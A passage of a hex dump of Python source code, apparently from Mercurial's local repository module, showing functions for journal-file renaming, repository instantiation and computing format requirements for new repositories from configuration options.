+0001fb80: 6174 615f 636f 6d70 7574 6572 735b 6b69  ata_computers[ki
+0001fb90: 6e64 5d5b 6361 7465 676f 7279 5d20 3d20  nd][category] = 
+0001fba0: 286b 6579 732c 2063 6f6d 7075 7465 722c  (keys, computer,
+0001fbb0: 2066 6c61 6773 290a 0a0a 2320 7573 6564   flags)...# used
+0001fbc0: 2074 6f20 6176 6f69 6420 6369 7263 756c   to avoid circul
+0001fbd0: 6172 2072 6566 6572 656e 6365 7320 736f  ar references so
+0001fbe0: 2064 6573 7472 7563 746f 7273 2077 6f72   destructors wor
+0001fbf0: 6b0a 6465 6620 6166 7465 7274 7261 6e73  k.def aftertrans
+0001fc00: 2866 696c 6573 293a 0a20 2020 2072 656e  (files):.    ren
+0001fc10: 616d 6566 696c 6573 203d 205b 7475 706c  amefiles = [tupl
+0001fc20: 6528 7429 2066 6f72 2074 2069 6e20 6669  e(t) for t in fi
+0001fc30: 6c65 735d 0a0a 2020 2020 6465 6620 6128  les]..    def a(
+0001fc40: 293a 0a20 2020 2020 2020 2066 6f72 2076  ):.        for v
+0001fc50: 6673 2c20 7372 632c 2064 6573 7420 696e  fs, src, dest in
+0001fc60: 2072 656e 616d 6566 696c 6573 3a0a 2020   renamefiles:.  
+0001fc70: 2020 2020 2020 2020 2020 2320 6966 2073            # if s
+0001fc80: 7263 2061 6e64 2064 6573 7420 7265 6665  rc and dest refe
+0001fc90: 7220 746f 2061 2073 616d 6520 6669 6c65  r to a same file
+0001fca0: 2c20 7666 732e 7265 6e61 6d65 2069 7320  , vfs.rename is 
+0001fcb0: 6120 6e6f 2d6f 702c 0a20 2020 2020 2020  a no-op,.       
+0001fcc0: 2020 2020 2023 206c 6561 7669 6e67 2062       # leaving b
+0001fcd0: 6f74 6820 7372 6320 616e 6420 6465 7374  oth src and dest
+0001fce0: 206f 6e20 6469 736b 2e20 6465 6c65 7465   on disk. delete
+0001fcf0: 2064 6573 7420 746f 206d 616b 6520 7375   dest to make su
+0001fd00: 7265 0a20 2020 2020 2020 2020 2020 2023  re.            #
+0001fd10: 2074 6865 2072 656e 616d 6520 636f 756c   the rename coul
+0001fd20: 646e 2774 2062 6520 7375 6368 2061 206e  dn't be such a n
+0001fd30: 6f2d 6f70 2e0a 2020 2020 2020 2020 2020  o-op..          
+0001fd40: 2020 7666 732e 7472 7975 6e6c 696e 6b28    vfs.tryunlink(
+0001fd50: 6465 7374 290a 2020 2020 2020 2020 2020  dest).          
+0001fd60: 2020 7472 793a 0a20 2020 2020 2020 2020    try:.         
+0001fd70: 2020 2020 2020 2076 6673 2e72 656e 616d         vfs.renam
+0001fd80: 6528 7372 632c 2064 6573 7429 0a20 2020  e(src, dest).   
+0001fd90: 2020 2020 2020 2020 2065 7863 6570 7420           except 
+0001fda0: 4669 6c65 4e6f 7446 6f75 6e64 4572 726f  FileNotFoundErro
+0001fdb0: 723a 2020 2320 6a6f 7572 6e61 6c20 6669  r:  # journal fi
+0001fdc0: 6c65 2064 6f65 7320 6e6f 7420 7965 7420  le does not yet 
+0001fdd0: 6578 6973 740a 2020 2020 2020 2020 2020  exist.          
+0001fde0: 2020 2020 2020 7061 7373 0a0a 2020 2020        pass..    
+0001fdf0: 7265 7475 726e 2061 0a0a 0a64 6566 2075  return a...def u
+0001fe00: 6e64 6f6e 616d 6528 666e 3a20 6279 7465  ndoname(fn: byte
+0001fe10: 7329 202d 3e20 6279 7465 733a 0a20 2020  s) -> bytes:.   
+0001fe20: 2062 6173 652c 206e 616d 6520 3d20 6f73   base, name = os
+0001fe30: 2e70 6174 682e 7370 6c69 7428 666e 290a  .path.split(fn).
+0001fe40: 2020 2020 6173 7365 7274 206e 616d 652e      assert name.
+0001fe50: 7374 6172 7473 7769 7468 2862 276a 6f75  startswith(b'jou
+0001fe60: 726e 616c 2729 0a20 2020 2072 6574 7572  rnal').    retur
+0001fe70: 6e20 6f73 2e70 6174 682e 6a6f 696e 2862  n os.path.join(b
+0001fe80: 6173 652c 206e 616d 652e 7265 706c 6163  ase, name.replac
+0001fe90: 6528 6227 6a6f 7572 6e61 6c27 2c20 6227  e(b'journal', b'
+0001fea0: 756e 646f 272c 2031 2929 0a0a 0a64 6566  undo', 1))...def
+0001feb0: 2069 6e73 7461 6e63 6528 7569 2c20 7061   instance(ui, pa
+0001fec0: 7468 3a20 6279 7465 732c 2063 7265 6174  th: bytes, creat
+0001fed0: 652c 2069 6e74 656e 7473 3d4e 6f6e 652c  e, intents=None,
+0001fee0: 2063 7265 6174 656f 7074 733d 4e6f 6e65   createopts=None
+0001fef0: 293a 0a20 2020 2023 2070 7265 7665 6e74  ):.    # prevent
+0001ff00: 2063 7963 6c69 6320 696d 706f 7274 206c   cyclic import l
+0001ff10: 6f63 616c 7265 706f 202d 3e20 7570 6772  ocalrepo -> upgr
+0001ff20: 6164 6520 2d3e 206c 6f63 616c 7265 706f  ade -> localrepo
+0001ff30: 0a20 2020 2066 726f 6d20 2e20 696d 706f  .    from . impo
+0001ff40: 7274 2075 7067 7261 6465 0a0a 2020 2020  rt upgrade..    
+0001ff50: 6c6f 6361 6c70 6174 6820 3d20 7572 6c75  localpath = urlu
+0001ff60: 7469 6c2e 7572 6c6c 6f63 616c 7061 7468  til.urllocalpath
+0001ff70: 2870 6174 6829 0a20 2020 2069 6620 6372  (path).    if cr
+0001ff80: 6561 7465 3a0a 2020 2020 2020 2020 6372  eate:.        cr
+0001ff90: 6561 7465 7265 706f 7369 746f 7279 2875  eaterepository(u
+0001ffa0: 692c 206c 6f63 616c 7061 7468 2c20 6372  i, localpath, cr
+0001ffb0: 6561 7465 6f70 7473 3d63 7265 6174 656f  eateopts=createo
+0001ffc0: 7074 7329 0a0a 2020 2020 6465 6620 7265  pts)..    def re
+0001ffd0: 706f 5f6d 616b 6572 2829 3a0a 2020 2020  po_maker():.    
+0001ffe0: 2020 2020 7265 7475 726e 206d 616b 656c      return makel
+0001fff0: 6f63 616c 7265 706f 7369 746f 7279 2875  ocalrepository(u
+00020000: 692c 206c 6f63 616c 7061 7468 2c20 696e  i, localpath, in
+00020010: 7465 6e74 733d 696e 7465 6e74 7329 0a0a  tents=intents)..
+00020020: 2020 2020 7265 706f 203d 2072 6570 6f5f      repo = repo_
+00020030: 6d61 6b65 7228 290a 2020 2020 7265 706f  maker().    repo
+00020040: 203d 2075 7067 7261 6465 2e6d 6179 5f61   = upgrade.may_a
+00020050: 7574 6f5f 7570 6772 6164 6528 7265 706f  uto_upgrade(repo
+00020060: 2c20 7265 706f 5f6d 616b 6572 290a 2020  , repo_maker).  
+00020070: 2020 7265 7475 726e 2072 6570 6f0a 0a0a    return repo...
+00020080: 6465 6620 6973 6c6f 6361 6c28 7061 7468  def islocal(path
+00020090: 3a20 6279 7465 7329 202d 3e20 626f 6f6c  : bytes) -> bool
+000200a0: 3a0a 2020 2020 7265 7475 726e 2054 7275  :.    return Tru
+000200b0: 650a 0a0a 6465 6620 6465 6661 756c 7463  e...def defaultc
+000200c0: 7265 6174 656f 7074 7328 7569 2c20 6372  reateopts(ui, cr
+000200d0: 6561 7465 6f70 7473 3d4e 6f6e 6529 3a0a  eateopts=None):.
+000200e0: 2020 2020 2222 2250 6f70 756c 6174 6520      """Populate 
+000200f0: 7468 6520 6465 6661 756c 7420 6372 6561  the default crea
+00020100: 7469 6f6e 206f 7074 696f 6e73 2066 6f72  tion options for
+00020110: 2061 2072 6570 6f73 6974 6f72 792e 0a0a   a repository...
+00020120: 2020 2020 4120 6469 6374 696f 6e61 7279      A dictionary
+00020130: 206f 6620 6578 706c 6963 6974 6c79 2072   of explicitly r
+00020140: 6571 7565 7374 6564 2063 7265 6174 696f  equested creatio
+00020150: 6e20 6f70 7469 6f6e 7320 6361 6e20 6265  n options can be
+00020160: 2070 6173 7365 640a 2020 2020 696e 2e20   passed.    in. 
+00020170: 4d69 7373 696e 6720 6b65 7973 2077 696c  Missing keys wil
+00020180: 6c20 6265 2070 6f70 756c 6174 6564 2e0a  l be populated..
+00020190: 2020 2020 2222 220a 2020 2020 6372 6561      """.    crea
+000201a0: 7465 6f70 7473 203d 2064 6963 7428 6372  teopts = dict(cr
+000201b0: 6561 7465 6f70 7473 206f 7220 7b7d 290a  eateopts or {}).
+000201c0: 0a20 2020 2069 6620 6227 6261 636b 656e  .    if b'backen
+000201d0: 6427 206e 6f74 2069 6e20 6372 6561 7465  d' not in create
+000201e0: 6f70 7473 3a0a 2020 2020 2020 2020 2320  opts:.        # 
+000201f0: 6578 7065 7269 6d65 6e74 616c 2063 6f6e  experimental con
+00020200: 6669 673a 2073 746f 7261 6765 2e6e 6577  fig: storage.new
+00020210: 2d72 6570 6f2d 6261 636b 656e 640a 2020  -repo-backend.  
+00020220: 2020 2020 2020 6372 6561 7465 6f70 7473        createopts
+00020230: 5b62 2762 6163 6b65 6e64 275d 203d 2075  [b'backend'] = u
+00020240: 692e 636f 6e66 6967 2862 2773 746f 7261  i.config(b'stora
+00020250: 6765 272c 2062 276e 6577 2d72 6570 6f2d  ge', b'new-repo-
+00020260: 6261 636b 656e 6427 290a 0a20 2020 2072  backend')..    r
+00020270: 6574 7572 6e20 6372 6561 7465 6f70 7473  eturn createopts
+00020280: 0a0a 0a64 6566 2063 6c6f 6e65 5f72 6571  ...def clone_req
+00020290: 7569 7265 6d65 6e74 7328 7569 2c20 6372  uirements(ui, cr
+000202a0: 6561 7465 6f70 7473 2c20 7372 6372 6570  eateopts, srcrep
+000202b0: 6f29 3a0a 2020 2020 2222 2263 6c6f 6e65  o):.    """clone
+000202c0: 2074 6865 2072 6571 7569 7265 6d65 6e74   the requirement
+000202d0: 7320 6f66 2061 206c 6f63 616c 2072 6570  s of a local rep
+000202e0: 6f20 666f 7220 6120 6c6f 6361 6c20 636c  o for a local cl
+000202f0: 6f6e 650a 0a20 2020 2054 6865 2073 746f  one..    The sto
+00020300: 7265 2072 6571 7569 7265 6d65 6e74 7320  re requirements 
+00020310: 6172 6520 756e 6368 616e 6765 6420 7768  are unchanged wh
+00020320: 696c 6520 7468 6520 776f 726b 696e 6720  ile the working 
+00020330: 636f 7079 2072 6571 7569 7265 6d65 6e74  copy requirement
+00020340: 730a 2020 2020 6465 7065 6e64 7320 6f6e  s.    depends on
+00020350: 2074 6865 2063 6f6e 6669 6775 7261 7469   the configurati
+00020360: 6f6e 0a20 2020 2022 2222 0a20 2020 2074  on.    """.    t
+00020370: 6172 6765 745f 7265 7175 6972 656d 656e  arget_requiremen
+00020380: 7473 203d 2073 6574 2829 0a20 2020 2069  ts = set().    i
+00020390: 6620 6e6f 7420 7372 6372 6570 6f2e 7265  f not srcrepo.re
+000203a0: 7175 6972 656d 656e 7473 3a0a 2020 2020  quirements:.    
+000203b0: 2020 2020 2320 7468 6973 2069 7320 6120      # this is a 
+000203c0: 6c65 6761 6379 2072 6576 6c6f 6720 2276  legacy revlog "v
+000203d0: 3022 2072 6570 6f73 6974 6f72 792c 2077  0" repository, w
+000203e0: 6520 6361 6e6e 6f74 2064 6f20 616e 7974  e cannot do anyt
+000203f0: 6869 6e67 2066 616e 6379 0a20 2020 2020  hing fancy.     
+00020400: 2020 2023 2077 6974 6820 6974 2e0a 2020     # with it..  
+00020410: 2020 2020 2020 7265 7475 726e 2074 6172        return tar
+00020420: 6765 745f 7265 7175 6972 656d 656e 7473  get_requirements
+00020430: 0a20 2020 2063 7265 6174 656f 7074 7320  .    createopts 
+00020440: 3d20 6465 6661 756c 7463 7265 6174 656f  = defaultcreateo
+00020450: 7074 7328 7569 2c20 6372 6561 7465 6f70  pts(ui, createop
+00020460: 7473 3d63 7265 6174 656f 7074 7329 0a20  ts=createopts). 
+00020470: 2020 2066 6f72 2072 2069 6e20 6e65 7772     for r in newr
+00020480: 6570 6f72 6571 7569 7265 6d65 6e74 7328  eporequirements(
+00020490: 7569 2c20 6372 6561 7465 6f70 7473 293a  ui, createopts):
+000204a0: 0a20 2020 2020 2020 2069 6620 7220 696e  .        if r in
+000204b0: 2072 6571 7569 7265 6d65 6e74 736d 6f64   requirementsmod
+000204c0: 2e57 4f52 4b49 4e47 5f44 4952 5f52 4551  .WORKING_DIR_REQ
+000204d0: 5549 5245 4d45 4e54 533a 0a20 2020 2020  UIREMENTS:.     
+000204e0: 2020 2020 2020 2074 6172 6765 745f 7265         target_re
+000204f0: 7175 6972 656d 656e 7473 2e61 6464 2872  quirements.add(r
+00020500: 290a 0a20 2020 2066 6f72 2072 2069 6e20  )..    for r in 
+00020510: 7372 6372 6570 6f2e 7265 7175 6972 656d  srcrepo.requirem
+00020520: 656e 7473 3a0a 2020 2020 2020 2020 6966  ents:.        if
+00020530: 2072 206e 6f74 2069 6e20 7265 7175 6972   r not in requir
+00020540: 656d 656e 7473 6d6f 642e 574f 524b 494e  ementsmod.WORKIN
+00020550: 475f 4449 525f 5245 5155 4952 454d 454e  G_DIR_REQUIREMEN
+00020560: 5453 3a0a 2020 2020 2020 2020 2020 2020  TS:.            
+00020570: 7461 7267 6574 5f72 6571 7569 7265 6d65  target_requireme
+00020580: 6e74 732e 6164 6428 7229 0a20 2020 2072  nts.add(r).    r
+00020590: 6574 7572 6e20 7461 7267 6574 5f72 6571  eturn target_req
+000205a0: 7569 7265 6d65 6e74 730a 0a0a 6465 6620  uirements...def 
+000205b0: 6e65 7772 6570 6f72 6571 7569 7265 6d65  newreporequireme
+000205c0: 6e74 7328 7569 2c20 6372 6561 7465 6f70  nts(ui, createop
+000205d0: 7473 293a 0a20 2020 2022 2222 4465 7465  ts):.    """Dete
+000205e0: 726d 696e 6520 7468 6520 7365 7420 6f66  rmine the set of
+000205f0: 2072 6571 7569 7265 6d65 6e74 7320 666f   requirements fo
+00020600: 7220 6120 6e65 7720 6c6f 6361 6c20 7265  r a new local re
+00020610: 706f 7369 746f 7279 2e0a 0a20 2020 2045  pository...    E
+00020620: 7874 656e 7369 6f6e 7320 6361 6e20 7772  xtensions can wr
+00020630: 6170 2074 6869 7320 6675 6e63 7469 6f6e  ap this function
+00020640: 2074 6f20 7370 6563 6966 7920 6375 7374   to specify cust
+00020650: 6f6d 2072 6571 7569 7265 6d65 6e74 7320  om requirements 
+00020660: 666f 720a 2020 2020 6e65 7720 7265 706f  for.    new repo
+00020670: 7369 746f 7269 6573 2e0a 2020 2020 2222  sitories..    ""
+00020680: 220a 0a20 2020 2069 6620 6227 6261 636b  "..    if b'back
+00020690: 656e 6427 206e 6f74 2069 6e20 6372 6561  end' not in crea
+000206a0: 7465 6f70 7473 3a0a 2020 2020 2020 2020  teopts:.        
+000206b0: 7261 6973 6520 6572 726f 722e 5072 6f67  raise error.Prog
+000206c0: 7261 6d6d 696e 6745 7272 6f72 280a 2020  rammingError(.  
+000206d0: 2020 2020 2020 2020 2020 6227 6261 636b            b'back
+000206e0: 656e 6420 6b65 7920 6e6f 7420 7072 6573  end key not pres
+000206f0: 656e 7420 696e 2063 7265 6174 656f 7074  ent in createopt
+00020700: 733b 2027 0a20 2020 2020 2020 2020 2020  s; '.           
+00020710: 2062 2777 6173 2064 6566 6175 6c74 6372   b'was defaultcr
+00020720: 6561 7465 6f70 7473 2829 2063 616c 6c65  eateopts() calle
+00020730: 643f 270a 2020 2020 2020 2020 290a 0a20  d?'.        ).. 
+00020740: 2020 2069 6620 6372 6561 7465 6f70 7473     if createopts
+00020750: 5b62 2762 6163 6b65 6e64 275d 2021 3d20  [b'backend'] != 
+00020760: 6227 7265 766c 6f67 7631 273a 0a20 2020  b'revlogv1':.   
+00020770: 2020 2020 2072 6169 7365 2065 7272 6f72       raise error
+00020780: 2e41 626f 7274 280a 2020 2020 2020 2020  .Abort(.        
+00020790: 2020 2020 5f28 0a20 2020 2020 2020 2020      _(.         
+000207a0: 2020 2020 2020 2062 2775 6e61 626c 6520         b'unable 
+000207b0: 746f 2064 6574 6572 6d69 6e65 2072 6570  to determine rep
+000207c0: 6f73 6974 6f72 7920 7265 7175 6972 656d  ository requirem
+000207d0: 656e 7473 2066 6f72 2027 0a20 2020 2020  ents for '.     
+000207e0: 2020 2020 2020 2020 2020 2062 2773 746f             b'sto
+000207f0: 7261 6765 2062 6163 6b65 6e64 3a20 2573  rage backend: %s
+00020800: 270a 2020 2020 2020 2020 2020 2020 290a  '.            ).
+00020810: 2020 2020 2020 2020 2020 2020 2520 6372              % cr
+00020820: 6561 7465 6f70 7473 5b62 2762 6163 6b65  eateopts[b'backe
+00020830: 6e64 275d 0a20 2020 2020 2020 2029 0a0a  nd'].        )..
+00020840: 2020 2020 7265 7175 6972 656d 656e 7473      requirements
+00020850: 203d 207b 7265 7175 6972 656d 656e 7473   = {requirements
+00020860: 6d6f 642e 5245 564c 4f47 5631 5f52 4551  mod.REVLOGV1_REQ
+00020870: 5549 5245 4d45 4e54 7d0a 2020 2020 6966  UIREMENT}.    if
+00020880: 2075 692e 636f 6e66 6967 626f 6f6c 2862   ui.configbool(b
+00020890: 2766 6f72 6d61 7427 2c20 6227 7573 6573  'format', b'uses
+000208a0: 746f 7265 2729 3a0a 2020 2020 2020 2020  tore'):.        
+000208b0: 7265 7175 6972 656d 656e 7473 2e61 6464  requirements.add
+000208c0: 2872 6571 7569 7265 6d65 6e74 736d 6f64  (requirementsmod
+000208d0: 2e53 544f 5245 5f52 4551 5549 5245 4d45  .STORE_REQUIREME
+000208e0: 4e54 290a 2020 2020 2020 2020 6966 2075  NT).        if u
+000208f0: 692e 636f 6e66 6967 626f 6f6c 2862 2766  i.configbool(b'f
+00020900: 6f72 6d61 7427 2c20 6227 7573 6566 6e63  ormat', b'usefnc
+00020910: 6163 6865 2729 3a0a 2020 2020 2020 2020  ache'):.        
+00020920: 2020 2020 7265 7175 6972 656d 656e 7473      requirements
+00020930: 2e61 6464 2872 6571 7569 7265 6d65 6e74  .add(requirement
+00020940: 736d 6f64 2e46 4e43 4143 4845 5f52 4551  smod.FNCACHE_REQ
+00020950: 5549 5245 4d45 4e54 290a 2020 2020 2020  UIREMENT).      
+00020960: 2020 2020 2020 6966 2075 692e 636f 6e66        if ui.conf
+00020970: 6967 626f 6f6c 2862 2766 6f72 6d61 7427  igbool(b'format'
+00020980: 2c20 6227 646f 7465 6e63 6f64 6527 293a  , b'dotencode'):
+00020990: 0a20 2020 2020 2020 2020 2020 2020 2020  .               
+000209a0: 2072 6571 7569 7265 6d65 6e74 732e 6164   requirements.ad
+000209b0: 6428 7265 7175 6972 656d 656e 7473 6d6f  d(requirementsmo
+000209c0: 642e 444f 5445 4e43 4f44 455f 5245 5155  d.DOTENCODE_REQU
+000209d0: 4952 454d 454e 5429 0a0a 2020 2020 636f  IREMENT)..    co
+000209e0: 6d70 656e 6769 6e65 7320 3d20 7569 2e63  mpengines = ui.c
+000209f0: 6f6e 6669 676c 6973 7428 6227 666f 726d  onfiglist(b'form
+00020a00: 6174 272c 2062 2772 6576 6c6f 672d 636f  at', b'revlog-co
+00020a10: 6d70 7265 7373 696f 6e27 290a 2020 2020  mpression').    
+00020a20: 666f 7220 636f 6d70 656e 6769 6e65 2069  for compengine i
+00020a30: 6e20 636f 6d70 656e 6769 6e65 733a 0a20  n compengines:. 
+00020a40: 2020 2020 2020 2069 6620 636f 6d70 656e         if compen
+00020a50: 6769 6e65 2069 6e20 7574 696c 2e63 6f6d  gine in util.com
+00020a60: 7065 6e67 696e 6573 3a0a 2020 2020 2020  pengines:.      
+00020a70: 2020 2020 2020 656e 6769 6e65 203d 2075        engine = u
+00020a80: 7469 6c2e 636f 6d70 656e 6769 6e65 735b  til.compengines[
+00020a90: 636f 6d70 656e 6769 6e65 5d0a 2020 2020  compengine].    
+00020aa0: 2020 2020 2020 2020 6966 2065 6e67 696e          if engin
+00020ab0: 652e 6176 6169 6c61 626c 6528 2920 616e  e.available() an
+00020ac0: 6420 656e 6769 6e65 2e72 6576 6c6f 6768  d engine.revlogh
+00020ad0: 6561 6465 7228 293a 0a20 2020 2020 2020  eader():.       
+00020ae0: 2020 2020 2020 2020 2062 7265 616b 0a20           break. 
+00020af0: 2020 2065 6c73 653a 0a20 2020 2020 2020     else:.       
+00020b00: 2072 6169 7365 2065 7272 6f72 2e41 626f   raise error.Abo
+00020b10: 7274 280a 2020 2020 2020 2020 2020 2020  rt(.            
+00020b20: 5f28 0a20 2020 2020 2020 2020 2020 2020  _(.             
+00020b30: 2020 2062 2763 6f6d 7072 6573 7369 6f6e     b'compression
+00020b40: 2065 6e67 696e 6573 2025 7320 6465 6669   engines %s defi
+00020b50: 6e65 6420 6279 2027 0a20 2020 2020 2020  ned by '.       
+00020b60: 2020 2020 2020 2020 2062 2766 6f72 6d61           b'forma
+00020b70: 742e 7265 766c 6f67 2d63 6f6d 7072 6573  t.revlog-compres
+00020b80: 7369 6f6e 206e 6f74 2061 7661 696c 6162  sion not availab
+00020b90: 6c65 270a 2020 2020 2020 2020 2020 2020  le'.            
+00020ba0: 290a 2020 2020 2020 2020 2020 2020 2520  ).            % 
+00020bb0: 6227 2c20 272e 6a6f 696e 2862 2722 2573  b', '.join(b'"%s
+00020bc0: 2227 2025 2065 2066 6f72 2065 2069 6e20  "' % e for e in 
+00020bd0: 636f 6d70 656e 6769 6e65 7329 2c0a 2020  compengines),.  
+00020be0: 2020 2020 2020 2020 2020 6869 6e74 3d5f            hint=_
+00020bf0: 280a 2020 2020 2020 2020 2020 2020 2020  (.              
+00020c00: 2020 6227 7275 6e20 2268 6720 6465 6275    b'run "hg debu
+00020c10: 6769 6e73 7461 6c6c 2220 746f 206c 6973  ginstall" to lis
+00020c20: 7420 6176 6169 6c61 626c 6520 270a 2020  t available '.  
+00020c30: 2020 2020 2020 2020 2020 2020 2020 6227                b'
+00020c40: 636f 6d70 7265 7373 696f 6e20 656e 6769  compression engi
+00020c50: 6e65 7327 0a20 2020 2020 2020 2020 2020  nes'.           
+00020c60: 2029 2c0a 2020 2020 2020 2020 290a 0a20   ),.        ).. 
+00020c70: 2020 2023 207a 6c69 6220 6973 2074 6865     # zlib is the
+00020c80: 2068 6973 746f 7269 6361 6c20 6465 6661   historical defa
+00020c90: 756c 7420 616e 6420 646f 6573 6e27 7420  ult and doesn't 
+00020ca0: 6e65 6564 2061 6e20 6578 706c 6963 6974  need an explicit
+00020cb0: 2072 6571 7569 7265 6d65 6e74 2e0a 2020   requirement..  
+00020cc0: 2020 6966 2063 6f6d 7065 6e67 696e 6520    if compengine 
+00020cd0: 3d3d 2062 277a 7374 6427 3a0a 2020 2020  == b'zstd':.    
+00020ce0: 2020 2020 7265 7175 6972 656d 656e 7473      requirements
+00020cf0: 2e61 6464 2862 2772 6576 6c6f 672d 636f  .add(b'revlog-co
+00020d00: 6d70 7265 7373 696f 6e2d 7a73 7464 2729  mpression-zstd')
+00020d10: 0a20 2020 2065 6c69 6620 636f 6d70 656e  .    elif compen
+00020d20: 6769 6e65 2021 3d20 6227 7a6c 6962 273a  gine != b'zlib':
+00020d30: 0a20 2020 2020 2020 2072 6571 7569 7265  .        require
+00020d40: 6d65 6e74 732e 6164 6428 6227 6578 702d  ments.add(b'exp-
+00020d50: 636f 6d70 7265 7373 696f 6e2d 2573 2720  compression-%s' 
+00020d60: 2520 636f 6d70 656e 6769 6e65 290a 0a20  % compengine).. 
+00020d70: 2020 2069 6620 7363 6d75 7469 6c2e 6764     if scmutil.gd
+00020d80: 696e 6974 636f 6e66 6967 2875 6929 3a0a  initconfig(ui):.
+00020d90: 2020 2020 2020 2020 7265 7175 6972 656d          requirem
+00020da0: 656e 7473 2e61 6464 2872 6571 7569 7265  ents.add(require
+00020db0: 6d65 6e74 736d 6f64 2e47 454e 4552 414c  mentsmod.GENERAL
+00020dc0: 4445 4c54 415f 5245 5155 4952 454d 454e  DELTA_REQUIREMEN
+00020dd0: 5429 0a20 2020 2020 2020 2069 6620 7569  T).        if ui
+00020de0: 2e63 6f6e 6669 6762 6f6f 6c28 6227 666f  .configbool(b'fo
+00020df0: 726d 6174 272c 2062 2773 7061 7273 652d  rmat', b'sparse-
+00020e00: 7265 766c 6f67 2729 3a0a 2020 2020 2020  revlog'):.      
+00020e10: 2020 2020 2020 7265 7175 6972 656d 656e        requiremen
+00020e20: 7473 2e61 6464 2872 6571 7569 7265 6d65  ts.add(requireme
+00020e30: 6e74 736d 6f64 2e53 5041 5253 4552 4556  ntsmod.SPARSEREV
+00020e40: 4c4f 475f 5245 5155 4952 454d 454e 5429  LOG_REQUIREMENT)
+00020e50: 0a0a 2020 2020 2320 6578 7065 7269 6d65  ..    # experime
+00020e60: 6e74 616c 2063 6f6e 6669 673a 2066 6f72  ntal config: for
+00020e70: 6d61 742e 7573 652d 6469 7273 7461 7465  mat.use-dirstate
+00020e80: 2d76 320a 2020 2020 2320 4b65 6570 2074  -v2.    # Keep t
+00020e90: 6869 7320 6c6f 6769 6320 696e 2073 796e  his logic in syn
+00020ea0: 6320 7769 7468 2060 6861 735f 6469 7273  c with `has_dirs
+00020eb0: 7461 7465 5f76 3228 2960 2069 6e20 6074  tate_v2()` in `t
+00020ec0: 6573 7473 2f68 6768 6176 652e 7079 600a  ests/hghave.py`.
+00020ed0: 2020 2020 6966 2075 692e 636f 6e66 6967      if ui.config
+00020ee0: 626f 6f6c 2862 2766 6f72 6d61 7427 2c20  bool(b'format', 
+00020ef0: 6227 7573 652d 6469 7273 7461 7465 2d76  b'use-dirstate-v
+00020f00: 3227 293a 0a20 2020 2020 2020 2072 6571  2'):.        req
+00020f10: 7569 7265 6d65 6e74 732e 6164 6428 7265  uirements.add(re
+00020f20: 7175 6972 656d 656e 7473 6d6f 642e 4449  quirementsmod.DI
+00020f30: 5253 5441 5445 5f56 325f 5245 5155 4952  RSTATE_V2_REQUIR
+00020f40: 454d 454e 5429 0a0a 2020 2020 2320 6578  EMENT)..    # ex
+00020f50: 7065 7269 6d65 6e74 616c 2063 6f6e 6669  perimental confi
+00020f60: 673a 2066 6f72 6d61 742e 6578 702d 7573  g: format.exp-us
+00020f70: 652d 636f 7069 6573 2d73 6964 652d 6461  e-copies-side-da
+00020f80: 7461 2d63 6861 6e67 6573 6574 0a20 2020  ta-changeset.   
+00020f90: 2069 6620 7569 2e63 6f6e 6669 6762 6f6f   if ui.configboo
+00020fa0: 6c28 6227 666f 726d 6174 272c 2062 2765  l(b'format', b'e
+00020fb0: 7870 2d75 7365 2d63 6f70 6965 732d 7369  xp-use-copies-si
+00020fc0: 6465 2d64 6174 612d 6368 616e 6765 7365  de-data-changese
+00020fd0: 7427 293a 0a20 2020 2020 2020 2072 6571  t'):.        req
+00020fe0: 7569 7265 6d65 6e74 732e 6164 6428 7265  uirements.add(re
+00020ff0: 7175 6972 656d 656e 7473 6d6f 642e 4348  quirementsmod.CH
+00021000: 414e 4745 4c4f 4756 325f 5245 5155 4952  ANGELOGV2_REQUIR
+00021010: 454d 454e 5429 0a20 2020 2020 2020 2072  EMENT).        r
+00021020: 6571 7569 7265 6d65 6e74 732e 6164 6428  equirements.add(
+00021030: 7265 7175 6972 656d 656e 7473 6d6f 642e  requirementsmod.
+00021040: 434f 5049 4553 5344 435f 5245 5155 4952  COPIESSDC_REQUIR
+00021050: 454d 454e 5429 0a20 2020 2069 6620 7569  EMENT).    if ui
+00021060: 2e63 6f6e 6669 6762 6f6f 6c28 6227 6578  .configbool(b'ex
+00021070: 7065 7269 6d65 6e74 616c 272c 2062 2774  perimental', b't
+00021080: 7265 656d 616e 6966 6573 7427 293a 0a20  reemanifest'):. 
+00021090: 2020 2020 2020 2072 6571 7569 7265 6d65         requireme
+000210a0: 6e74 732e 6164 6428 7265 7175 6972 656d  nts.add(requirem
+000210b0: 656e 7473 6d6f 642e 5452 4545 4d41 4e49  entsmod.TREEMANI
+000210c0: 4645 5354 5f52 4551 5549 5245 4d45 4e54  FEST_REQUIREMENT
+000210d0: 290a 0a20 2020 2063 6861 6e67 656c 6f67  )..    changelog
+000210e0: 7632 203d 2075 692e 636f 6e66 6967 2862  v2 = ui.config(b
+000210f0: 2766 6f72 6d61 7427 2c20 6227 6578 702d  'format', b'exp-
+00021100: 7573 652d 6368 616e 6765 6c6f 672d 7632  use-changelog-v2
+00021110: 2729 0a20 2020 2069 6620 6368 616e 6765  ').    if change
+00021120: 6c6f 6776 3220 3d3d 2062 2765 6e61 626c  logv2 == b'enabl
+00021130: 652d 756e 7374 6162 6c65 2d66 6f72 6d61  e-unstable-forma
+00021140: 742d 616e 642d 636f 7272 7570 742d 6d79  t-and-corrupt-my
+00021150: 2d64 6174 6127 3a0a 2020 2020 2020 2020  -data':.        
+00021160: 7265 7175 6972 656d 656e 7473 2e61 6464  requirements.add
+00021170: 2872 6571 7569 7265 6d65 6e74 736d 6f64  (requirementsmod
+00021180: 2e43 4841 4e47 454c 4f47 5632 5f52 4551  .CHANGELOGV2_REQ
+00021190: 5549 5245 4d45 4e54 290a 0a20 2020 2072  UIREMENT)..    r
+000211a0: 6576 6c6f 6776 3220 3d20 7569 2e63 6f6e  evlogv2 = ui.con
+000211b0: 6669 6728 6227 6578 7065 7269 6d65 6e74  fig(b'experiment
+000211c0: 616c 272c 2062 2772 6576 6c6f 6776 3227  al', b'revlogv2'
+000211d0: 290a 2020 2020 6966 2072 6576 6c6f 6776  ).    if revlogv
+000211e0: 3220 3d3d 2062 2765 6e61 626c 652d 756e  2 == b'enable-un
+000211f0: 7374 6162 6c65 2d66 6f72 6d61 742d 616e  stable-format-an
+00021200: 642d 636f 7272 7570 742d 6d79 2d64 6174  d-corrupt-my-dat
+00021210: 6127 3a0a 2020 2020 2020 2020 7265 7175  a':.        requ
+00021220: 6972 656d 656e 7473 2e64 6973 6361 7264  irements.discard
+00021230: 2872 6571 7569 7265 6d65 6e74 736d 6f64  (requirementsmod
+00021240: 2e52 4556 4c4f 4756 315f 5245 5155 4952  .REVLOGV1_REQUIR
